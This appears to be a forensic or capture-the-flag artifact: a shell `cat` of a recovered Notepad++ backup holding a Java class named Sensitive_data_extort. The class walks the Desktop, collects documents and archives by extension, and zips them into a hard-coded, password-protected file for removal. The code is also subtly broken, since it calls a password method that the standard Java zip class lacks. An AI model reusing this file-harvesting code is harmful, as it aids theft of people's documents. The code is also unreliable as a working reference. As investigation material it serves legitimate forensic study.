```bash
$ cat ./C/Users/Simon.stark/AppData/Roaming/Notepad++/backup/LootAndPurge.java@2023-07-24_145332
java
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class Sensitive_data_extort {
    public static void main(String[] args) {
        String username = System.getProperty("user.name");
        String desktopDirectory = "C:\\Users\\" + username + "\\Desktop\\";
        List<String> extensions = Arrays.asList("zip", "docx", "ppt", "xls", "md", "txt", "pdf");
        List<File> collectedFiles = new ArrayList<>();

        collectFiles(new File(desktopDirectory), extensions, collectedFiles);

        String zipFilePath = desktopDirectory + "Forela-Dev-Data.zip";
        String password = "sdklY57BLghvyh5FJ#fion_7";

        createZipArchive(collectedFiles, zipFilePath, password);

        System.out.println("Zip archive created successfully at: " + zipFilePath);
    }

    private static void collectFiles(File directory, List<String> extensions, List<File> collectedFiles) {
        File[] files = directory.listFiles();
        if (files != null) {
            for (File file : files) {
                if (file.isDirectory()) {
                    collectFiles(file, extensions, collectedFiles);
                } else {
                    String fileExtension = getFileExtension(file.getName());
                    if (extensions.contains(fileExtension)) {
                        collectedFiles.add(file);
                    }
                }
            }
        }
    }


    private static String getFileExtension(String fileName) {
        int dotIndex = fileName.lastIndexOf(".");
        if (dotIndex > 0 && dotIndex < fileName.length() - 1) {
            return fileName.substring(dotIndex + 1).toLowerCase();
        }
        return "";
    }

    private static void createZipArchive(List<File> files, String zipFilePath, String password) {
        byte[] buffer = new byte[1024];

        try (ZipOutputStream zipOutputStream = new ZipOutputStream(new FileOutputStream(zipFilePath))) {
            zipOutputStream.setMethod(ZipOutputStream.DEFLATED);
            zipOutputStream.setComment("Forela-Dev-Data.zip");
            zipOutputStream.setPassword(password.toCharArray());

            for (File file : files) {
                FileInputStream fileInputStream = new FileInputStream(file);
                zipOutputStream.putNextEntry(new ZipEntry(file.getName()));

                int length;
                while ((length = fileInputStream.read(buffer)) > 0) {
                    zipOutputStream.write(buffer, 0, length);
                }

                zipOutputStream.closeEntry();
                fileInputStream.close();
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
```
Forela-Dev-Data.zip